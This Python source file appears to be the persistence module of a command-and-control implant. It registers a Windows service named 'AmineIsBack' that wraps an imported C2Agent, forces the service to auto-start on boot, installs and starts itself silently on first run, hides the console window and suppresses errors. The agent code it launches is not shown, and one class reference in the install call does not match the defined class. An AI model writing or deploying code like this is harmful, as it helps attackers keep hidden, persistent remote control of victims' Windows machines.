import sys
import win32service
import win32serviceutil
import win32event
import servicemanager
from pathlib import Path

from client.config import Config
from client.utils import Logger, is_windows
from client.main import C2Agent


SERVICE_NAME = "AmineIsBack"
SERVICE_DISPLAY = "Amine Is Back"
SERVICE_DESC = "Amine Is Back"


class C2AgentService(win32serviceutil.ServiceFramework):
    _svc_name_ = SERVICE_NAME
    _svc_display_name_ = SERVICE_DISPLAY
    _svc_description_ = SERVICE_DESC
    _svc_start_type_ = win32service.SERVICE_AUTO_START

    def __init__(self, args):
        super().__init__(args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)

        self.config = Config()
        self.logger = Logger(
            enabled=self.config.get("logging", "enabled", False),
            log_file=self.config.get("logging", "file", None),
        )

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)

    def SvcDoRun(self):
        servicemanager.LogInfoMsg("AmineIsBack started")
        self.run_agent()

    def run_agent(self):
        if getattr(sys, "frozen", False):
            base_path = Path(sys.executable).parent
        else:
            base_path = Path(__file__).parent.parent

        config_path = base_path / "config.json"
        config = Config(str(config_path) if config_path.exists() else None)

        logger = Logger(
            enabled=config.get("logging", "enabled", False),
            log_file=config.get("logging", "file", None),
        )

        agent = C2Agent(config, logger)

        if is_windows() and not config.get("logging", "enabled", False):
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 0
                )
            except Exception:
                pass

        agent.run()


def service_exists():
    try:
        win32serviceutil.QueryServiceStatus(SERVICE_NAME)
        return True
    except Exception:
        return False


def ensure_autostart():
    hscm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)
    hsrv = win32service.OpenService(
        hscm,
        SERVICE_NAME,
        win32service.SERVICE_CHANGE_CONFIG,
    )

    win32service.ChangeServiceConfig(
        hsrv,
        win32service.SERVICE_NO_CHANGE,
        win32service.SERVICE_AUTO_START,
        win32service.SERVICE_NO_CHANGE,
        None,
        None,
        0,
        None,
        None,
        None,
        None,
    )

    win32service.CloseServiceHandle(hsrv)
    win32service.CloseServiceHandle(hscm)


def is_service_running():
    try:
        status = win32serviceutil.QueryServiceStatus(SERVICE_NAME)[1]
        return status == win32service.SERVICE_RUNNING
    except Exception:
        return False


def install_and_start():
    win32serviceutil.InstallService(
        pythonClassString=f"{__name__}.AmineIsBack",
        serviceName=SERVICE_NAME,
        displayName=SERVICE_DISPLAY,
        description=SERVICE_DESC,
        startType=win32service.SERVICE_AUTO_START,
    )

    win32serviceutil.StartService(SERVICE_NAME)


def bootstrap():
    if not is_windows():
        return

    if not service_exists():
        install_and_start()
        sys.exit(0)

    ensure_autostart()

    if not is_service_running():
        win32serviceutil.StartService(SERVICE_NAME)

    sys.exit(0)


if __name__ == "__main__":
    if len(sys.argv) == 1:
        try:
            bootstrap()
        except Exception:
            pass
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(C2AgentService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(C2AgentService)
